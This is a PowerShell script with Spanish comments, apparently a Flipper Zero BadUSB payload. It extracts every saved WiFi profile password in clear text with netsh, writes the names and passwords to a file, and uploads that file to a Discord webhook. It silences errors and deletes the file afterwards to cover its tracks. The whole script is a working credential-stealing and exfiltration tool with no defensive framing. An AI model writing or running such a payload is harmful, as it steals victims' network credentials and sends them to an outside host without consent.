# Obtener la lista de redes WiFi a las que se ha conectado el sistema
$wifiNetworks = (netsh wlan show profiles) -match 'Perfil de todos los usuarios   *: *([^\r\n]*)'

$ErrorActionPreference= 'silentlycontinue'

# Crear un archivo de texto para guardar la información
$filePath = "$env:C:\Redes_wifi.txt"
New-Item -ItemType File -Path $filePath -Force

# Recorrer la lista de redes WiFi y exportar su nombre y clave
foreach ($wifiNetwork in $wifiNetworks){
     $wifiNetwork = $wifiNetwork.split(":")[1].Trim()
     # Mostrar el valor de la variable $wifiNetwork en la consola

     # Obtener la contraseña de la red WiFi
     $wifiPassword = netsh wlan show profile name="$wifiNetwork" key=clear | Select-String 'Contenido de la clave'

     $wifiPassword="$wifiPassword".split(":")[1].Trim()

     # Guardar la información en el archivo de texto
	 
     Add-Content -Path $filePath -Value "Network: $wifiNetwork`nPassword: $wifiPassword"
 }


# Funcion creada por Jakoby para subir al servidor de Discord el archivo .txt
function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)
# URL de la API Discord que será obtenida por la variable $dc a traves de .txt que será ejecutado por FlipperZero.
$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:C:\Redes_wifi.txt"}

#borramos el txt 
Remove-Item "C:\Redes_wifi.txt"
